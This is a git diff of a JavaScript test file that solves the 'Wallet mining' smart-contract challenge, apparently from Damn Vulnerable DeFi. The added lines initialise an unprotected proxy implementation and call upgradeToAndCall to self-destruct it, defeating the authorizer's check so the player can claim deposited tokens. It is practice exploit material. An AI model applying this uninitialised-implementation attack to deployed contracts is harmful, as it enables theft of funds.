@@ -77,7 +77,6 @@ describe('[Challenge] Wallet mining', function () {
             authorizerImplmention.address,
             '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
         ));
-        // await authorizerImplmention.init([player.address], [DEPOSIT_ADDRESS]);
 
         console.log('mom', await walletDeployer.mom());
         console.log('owner of authorizer', await authorizer.owner());
@@ -98,6 +97,26 @@ describe('[Challenge] Wallet mining', function () {
         walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', player)).attach('0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B');
 
         const wmHelper = await (await ethers.getContractFactory('WalletMiningHelper')).deploy();
+        // init implmention
+        await authorizerImplmention.init([], []);
+        console.log('bingo before selfdestruct', await walletDeployer.bingo(player.address, DEPOSIT_ADDRESS));
+        // selfdestruct
+        await authorizerImplmention.upgradeToAndCall(wmHelper.address, '0x35f46994');
+        console.log('bingo after selfdestruct', await walletDeployer.bingo(player.address, DEPOSIT_ADDRESS));
+        console.log('bytecode of authorizer', await ethers.provider.getCode(authorizer.address));
+        console.log('bytecode of authorizerImplmention', await ethers.provider.getCode(authorizerImplmention.address));
+        // delegatecall or staticcall to an empty contract will return success with 0x
+        console.log('staticcallTest', await wmHelper.staticcallTest());
+        console.log('delegatecallTest', await wmHelper.delegatecallTest());
+
+        // var canCalldata = walletDeployer.interface.encodeFunctionData('bingo', [player.address, DEPOSIT_ADDRESS])
+        // console.log('bingoCall', canCalldata);
+        // // canCalldata = canCalldata.replace('3378c00', '3378cFF')
+        // console.log("bingo", walletDeployer.interface.decodeFunctionResult('bingo', await ethers.provider.call({
+        //     to: walletDeployer.address,
+        //     data: canCalldata
+        // })));
+
         const initData = GnosisSafe.interface.encodeFunctionData('setup', [
             [player.address],
             1,
@@ -108,24 +127,6 @@ describe('[Challenge] Wallet mining', function () {
             0,
             '0x0000000000000000000000000000000000000000'
         ]);
-
-        // var canCalldata = walletDeployer.interface.encodeFunctionData('bingo', [player.address, DEPOSIT_ADDRESS])
-        // console.log('bingoCall', canCalldata);
-        // // canCalldata = canCalldata.replace('3378c00', '3378cFF')
-        // console.log("bingo", walletDeployer.interface.decodeFunctionResult('bingo', await ethers.provider.call({
-        //     to: walletDeployer.address,
-        //     data: canCalldata
-        // })));
-        console.log('bingo', await walletDeployer.bingo(player.address, DEPOSIT_ADDRESS));
-        console.log('bingo', await walletDeployer.bingo(ward.address, DEPOSIT_ADDRESS));
-
-        // TODO 没找到其他方式去获取 walletDeployer 的 token
-        await authorizer.upgradeTo(wmHelper.address);
-        // await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;
-        // await authorizerImplmention.connect(player).upgradeTo(wmHelper.address);
-        // await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.true;
-        // await authorizer.connect(player).init([player.address], [DEPOSIT_ADDRESS]);
-
         var i = 0;
         while ((await ethers.provider.getCode(DEPOSIT_ADDRESS)) == '0x') {
             i++;
